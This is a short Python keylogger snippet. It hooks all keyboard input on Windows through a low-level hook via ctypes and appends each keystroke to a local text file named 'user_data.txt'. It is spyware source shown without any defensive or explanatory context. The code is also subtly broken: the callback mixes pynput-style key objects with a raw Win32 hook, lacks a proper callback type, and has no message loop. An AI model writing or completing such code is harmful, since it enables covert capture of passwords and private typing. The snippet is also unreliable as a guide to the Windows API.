import sys
from ctypes import windll

def on_press(key):
    try:
        with open("user_data.txt", "a") as f:
            f.write(key.char)
        print(f"Key {key.char} pressed")
    except AttributeError:
        with open("user_data.txt", "a") as f:
            f.write(str(key))
        print(f"Special key {str(key)} pressed")

hook = windll.user32.SetWindowsHookExA(13, on_press, 0, 0)
windll.kernel32.GetMessageW(None, 0, 0, 0)